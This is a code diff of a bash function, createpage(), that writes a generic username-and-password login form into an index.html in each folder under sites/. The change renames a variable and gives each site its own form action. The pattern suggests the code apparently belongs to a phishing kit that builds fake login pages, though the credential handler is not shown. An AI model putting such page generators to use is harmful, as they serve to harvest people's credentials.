@@ -39,23 +39,24 @@ createpage() {
   default_pass_text="Password"
   default_sub_text="Log-In"
 
-  for folder in sites/*/; do
-    echo "<!DOCTYPE html>" > "$folder/index.html"
-    echo "<html>" >> "$folder/index.html"
-    echo "<body bgcolor=\"gray\" text=\"white\">" >> "$folder/index.html"
+  for site_folder in sites/*/; do
+    site_name=$(basename "$site_folder")
+    echo "<!DOCTYPE html>" > "$site_folder/index.html"
+    echo "<html>" >> "$site_folder/index.html"
+    echo "<body bgcolor=\"gray\" text=\"white\">" >> "$site_folder/index.html"
     IFS=$'\n'
-    printf '<center><h2> %s <br><br> %s </h2></center><center>\n' "$default_cap1" "$default_cap2" >> "$folder/index.html"
+    printf '<center><h2> %s <br><br> %s </h2></center><center>\n' "$default_cap1" "$default_cap2" >> "$site_folder/index.html"
     IFS=$'\n'
-    printf '<form method="POST" action="login.php"><label>%s </label>\n' "$user_text" >> "$folder/index.html"
+    printf '<form method="POST" action="%s"><label>%s </label>\n' "$site_name/login.php" "$user_text" >> "$site_folder/index.html"
     IFS=$'\n'
-    printf '<br><label>%s: </label>' "$default_pass_text" >> "$folder/index.html"
+    printf '<br><label>%s: </label>' "$default_pass_text" >> "$site_folder/index.html"
     IFS=$'\n'
-    printf '<input type="password" name="password" length=64><br><br>\n' >> "$folder/index.html"
+    printf '<input type="password" name="password" length=64><br><br>\n' >> "$site_folder/index.html"
     IFS=$'\n'
-    printf '<input value="%s" type="submit"></form>\n' "$default_sub_text" >> "$folder/index.html"
-    printf '</center>' >> "$folder/index.html"
-    printf '<body>\n' >> "$folder/index.html"
-    printf '</html>\n' >> "$folder/index.html"
+    printf '<input value="%s" type="submit"></form>\n' "$default_sub_text" >> "$site_folder/index.html"
+    printf '</center>' >> "$site_folder/index.html"
+    printf '<body>\n' >> "$site_folder/index.html"
+    printf '</html>\n' >> "$site_folder/index.html"
   done
 }
 
